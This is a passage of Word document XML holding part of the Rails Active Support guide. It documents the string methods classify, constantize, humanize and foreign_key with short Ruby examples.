            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="503F0147" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The method understands qualified table names:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="31EC3BFC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C20D085" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="150602552"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"highrise_production.companies".classify # =&gt; "Company"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4EC5F8D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>classify</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a class name as a string. You can get the actual class object invoking </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>constantize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on it, explained next.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE7C565" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258C6825" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>constantize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16840C9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>constantize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> resolves the constant reference expression in its receiver:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="52145994" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62E4AD36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Fixnum".constantize # =&gt; Fixnum</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79D5EA13" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E81C59A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73867198" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  X</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07C0CD75" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A96B116" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"M::X".constantize # =&gt; 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="71BD72A1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the string evaluates to no known constant, or its content is not even a valid constant name, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>constantize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> raises </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NameError</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE391F6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Constant name resolution by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>constantize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> starts always at the top-level </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Object</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> even if there is no leading “::”.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="10387F17" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34634D6E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= :in_Object</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="609E3E3D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31C69CBA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  X</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= :in_M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B775AFF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CEAB0CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  X</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">                 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; :in_M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="728D3283" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "::X".constantize # =&gt; :in_Object</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DD7B278" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "X".constantize   # =&gt; :in_Object (!)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46E66834" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="627053EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>So, it is in general not equivalent to what Ruby would do in the same spot, had a real constant be evaluated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5051EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Mailer test cases obtain the mailer being tested from the name of the test class using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>constantize</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="236AF83E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="466334EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># action_mailer/test_case.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66F26DC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>determine_default_mailer(name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D69FA33" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  name.sub(/Test$/, '').constantize</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65B07C59" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rescue</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>NameError =&gt; e</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E9F4C0E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>NonInferrableMailerError.new(name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00359A3E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="59C23372" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3C8B3D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>humanize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB64913" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>humanize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gives you a sensible name for display out of an attribute name. To do so it replaces underscores with spaces, removes any “_id” suffix, and capitalizes the first word:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5640"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4F3458FC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F1E344C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"name".humanize           # =&gt; "Name"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64C90BA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"author_id".humanize      # =&gt; "Author"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FD09016" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"comments_count".humanize # =&gt; "Comments count"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26468FD8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The helper method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>full_messages</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>humanize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as a fallback to include attribute names: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CE2474B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C091234" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>full_messages</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="030C52B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  full_messages = []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0ACD4F9C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0173B818" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  each</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|attribute, messages|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F6A1F77" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3545F000" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    attr_name = attribute.to_s.gsub('.', '_').humanize</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57151141" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    attr_name = @base.class.human_attribute_name(attribute, :default</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; attr_name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E43E1F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D40F4DB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FFE68DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E0A21D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  full_messages</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35C0B4BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4FD5EE86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2C6232" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABFF800" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>foreign_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gives a foreign key column name from a class name. To do so it demodulizes, underscores, and adds “_id”:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0C4AA189" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0199D7B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"User".foreign_key           # =&gt; "user_id"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05F463EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"InvoiceLine".foreign_key    # =&gt; "invoice_line_id"</w:t>
            </w:r>
          </w:p>
